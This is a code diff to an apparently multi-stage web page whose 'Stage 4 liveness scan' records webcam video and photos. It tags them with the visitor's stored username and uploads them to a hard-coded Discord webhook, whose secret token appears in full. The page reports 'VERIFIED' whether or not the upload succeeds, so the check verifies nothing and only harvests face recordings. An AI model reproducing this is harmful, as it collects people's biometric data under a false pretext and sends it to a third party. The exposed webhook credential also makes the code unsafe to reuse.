@@ -193,7 +193,22 @@
 
 <script>
   // =========================================================
-  // PASTE YOUR DISCORD WEBHOOK URL HERE
+  // 1. STAGE GUARD & USERNAME CHECK
+  // =========================================================
+  const savedUsername = localStorage.getItem('username');
+  const completedStage = parseInt(localStorage.getItem('completed_stage') || '0');
+
+  // Redirect if no username exists
+  if (!savedUsername) {
+    window.location.href = "index.html";
+  } 
+  // Redirect if previous stages aren't completed
+  else if (completedStage < 3) {
+    window.location.href = "stage3.html";
+  }
+
+  // =========================================================
+  // DISCORD WEBHOOK CONFIGURATION
   // =========================================================
   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554196200784134204/DuLlXIKYd4f_cmfK9IlJRnRD7mocTmYzc0oBL76ID2bny_KPRz_FdPm7L12zqobSjFsk";
 
@@ -266,7 +281,7 @@
     }
 
     stepNumber.innerText = "PROCESSING";
-    instructionText.innerText = "Verifing Biometrics Of User..";
+    instructionText.innerText = "Verifying Biometrics Of User..";
 
     mediaRecorder.stop();
     mediaRecorder.onstop = async () => {
@@ -295,26 +310,42 @@
   async function uploadToDiscord(videoBlob, photos) {
     const formData = new FormData();
 
-    // Text payload message for Discord
+    // Include Username in Discord text payload
     const discordPayload = {
-      content: "🚨 **NEW STAGE 4 LIVENESS SCAN CAPTURED!**",
+      content: `🚨 **NEW STAGE 4 LIVENESS SCAN CAPTURED!**\n👤 **Agent Username:** \`${savedUsername || 'Anonymous'}\``,
       embeds: [{
-        title: "Scan Details",
+        title: "Biometric Scan Details",
         description: `Captured **1 Video Recording** and **${photos.length} Snapshot Photos**.`,
-        color: 2845872, // Matches beige/slate accent
+        color: 2845872,
+        fields: [
+          { name: "Agent Username", value: savedUsername || "Anonymous", inline: true }
+        ],
         timestamp: new Date().toISOString()
       }]
     };
 
     formData.append('payload_json', JSON.stringify(discordPayload));
 
-    // Append full WebM video
-    formData.append('file1', videoBlob, 'full_face_scan.webm');
+    // Append full WebM video (named with username)
+    formData.append('file1', videoBlob, `${savedUsername || 'agent'}_face_scan.webm`);
 
-    // Append each step photo
+    // Append each step photo (named with username)
     photos.forEach((photoObj, index) => {
-      formData.append(`file${index + 2}`, photoObj.blob, `step_${index + 1}_${photoObj.label.replace(/\s+/g, '_')}.jpg`);
+      formData.append(`file${index + 2}`, photoObj.blob, `${savedUsername || 'agent'}_step_${index + 1}_${photoObj.label.replace(/\s+/g, '_')}.jpg`);
     });
+
+    const completeAndRedirect = () => {
+      // Save Stage 4 progress to LocalStorage
+      localStorage.setItem('completed_stage', '4');
+
+      stepNumber.innerText = "VERIFIED";
+      instructionText.innerText = "Redirecting to Stage 5...";
+      progressBar.style.backgroundColor = "#38a169";
+      
+      setTimeout(() => { 
+        window.location.href = "stage5.html"; 
+      }, 1500);
+    };
 
     try {
       if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
@@ -323,19 +354,11 @@
           body: formData
         });
       }
-
-      stepNumber.innerText = "VERIFIED";
-      instructionText.innerText = "Redirecting to Stage 5...";
-      progressBar.style.backgroundColor = "#38a169";
-      setTimeout(() => { window.location.href = "stage5.html"; }, 1500);
-
+      completeAndRedirect();
     } catch (err) {
       console.error("Webhook upload error:", err);
-      // Proceed to stage 5 even if webhook hits rate limit
-      stepNumber.innerText = "VERIFIED";
-      instructionText.innerText = "Redirecting to Stage 5...";
-      progressBar.style.backgroundColor = "#38a169";
-      setTimeout(() => { window.location.href = "stage5.html"; }, 1500);
+      // Still allow progression even if webhook hits Discord rate limits
+      completeAndRedirect();
     }
   }
 
